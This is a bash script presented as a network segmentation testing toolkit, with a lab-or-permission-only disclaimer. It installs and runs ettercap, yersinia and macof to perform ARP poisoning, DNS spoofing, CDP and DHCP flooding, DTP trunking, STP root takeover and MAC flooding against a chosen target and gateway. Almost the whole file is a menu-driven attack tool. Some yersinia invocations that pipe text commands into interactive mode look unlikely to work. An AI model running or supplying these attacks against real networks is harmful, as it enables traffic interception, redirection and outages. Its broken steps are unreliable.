#!/bin/bash

# Network Segmentation Testing Toolkit
# FOR LEGAL USE IN LAB OR WITH WRITTEN PERMISSION ONLY

REQUIRED_TOOLS=(ettercap yersinia hping3 macof arping)
LOGFILE="results.log"
JSONLOG="results.json"
OUTPUT_JSON=()

check_and_install_tools() {
    echo "[*] Checking required tools..."
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v $tool &>/dev/null; then
            echo "[-] $tool not found. Installing..."
            sudo apt install -y $tool
        else
            echo "[+] $tool installed."
        fi
    done
}

get_user_input() {
    read -p "Enter network interface (e.g., eth0): " INTERFACE
    read -p "Enter target IP or subnet (e.g., 192.168.1.100 or 192.168.1.0/24): " TARGET
    read -p "Enter gateway IP (e.g., 192.168.1.1): " GATEWAY
}

log_result() {
    local title="$1"
    local status="$2"
    local message="$3"

    echo "[$(date +%T)] $title - $status: $message" | tee -a "$LOGFILE"

    OUTPUT_JSON+=("{\"attack\":\"$title\",\"status\":\"$status\",\"info\":\"$message\"}")
}

arp_poisoning_attack() {
    echo "[*] Running ARP Poisoning Attack..."
    sudo ettercap -T -M arp:remote /$GATEWAY/ /$TARGET/ &
    sleep 10
    pkill ettercap
    log_result "ARP Poisoning" "Completed" "ARP spoof between $GATEWAY and $TARGET"
}

dns_poisoning_attack() {
    echo "[*] Simulating DNS Spoofing..."
    echo "* A 1.2.3.4" > /tmp/dns_hosts
    sudo ettercap -T -q -i $INTERFACE -P dns_spoof -M arp:remote /$GATEWAY/ /$TARGET/ -F /tmp/dns_hosts &
    sleep 10
    pkill ettercap
    log_result "DNS Spoofing" "Completed" "Spoofed DNS response sent to $TARGET"
}

cdp_flooding_attack() {
    echo "[*] Sending CDP Flood..."
    echo "cdp flood" | sudo yersinia -I
    log_result "CDP Flood" "Completed" "Flooded switch with fake CDP packets"
}

dhcp_flooding_attack() {
    echo "[*] Starting DHCP Starvation..."
    echo "dhcp discover flood" | sudo yersinia -I
    log_result "DHCP Starvation" "Completed" "Sent multiple DHCP Discover requests"
}

dtp_attack() {
    echo "[*] DTP Trunking Attack..."
    echo "dtp enable trunk" | sudo yersinia -I
    log_result "DTP Attack" "Attempted" "Tried to enable trunking on switch"
}

stp_root_manipulation() {
    echo "[*] STP Root Bridge Attack..."
    echo "stp become root" | sudo yersinia -I
    log_result "STP Root Attack" "Attempted" "Tried to become STP root bridge"
}

mac_flooding_attack() {
    echo "[*] MAC Flooding..."
    sudo macof -i $INTERFACE &
    sleep 15
    pkill macof
    log_result "MAC Flooding" "Completed" "Flooded CAM table with fake MACs"
}

run_all_attacks() {
    arp_poisoning_attack
    dns_poisoning_attack
    cdp_flooding_attack
    dhcp_flooding_attack
    dtp_attack
    stp_root_manipulation
    mac_flooding_attack
}

write_json_log() {
    echo "[*] Writing results to $JSONLOG..."
    echo "[${OUTPUT_JSON[*]}]" | jq '.' > "$JSONLOG"
}

main_menu() {
    clear
    echo "=== Network Segmentation Attack Toolkit ==="
    echo "[1] ARP Poisoning"
    echo "[2] DNS Spoofing"
    echo "[3] CDP Flooding"
    echo "[4] DHCP Starvation"
    echo "[5] DTP Trunking Attack"
    echo "[6] STP Root Manipulation"
    echo "[7] MAC Flooding"
    echo "[8] Run All"
    echo "[0] Exit"
    echo "=========================================="
    read -p "Choose an option: " opt

    case $opt in
        1) arp_poisoning_attack ;;
        2) dns_poisoning_attack ;;
        3) cdp_flooding_attack ;;
        4) dhcp_flooding_attack ;;
        5) dtp_attack ;;
        6) stp_root_manipulation ;;
        7) mac_flooding_attack ;;
        8) run_all_attacks ;;
        0) write_json_log; exit 0 ;;
        *) echo "Invalid option" ;;
    esac
    write_json_log
}

# Main Execution
check_and_install_tools
get_user_input

while true; do
    main_menu
done
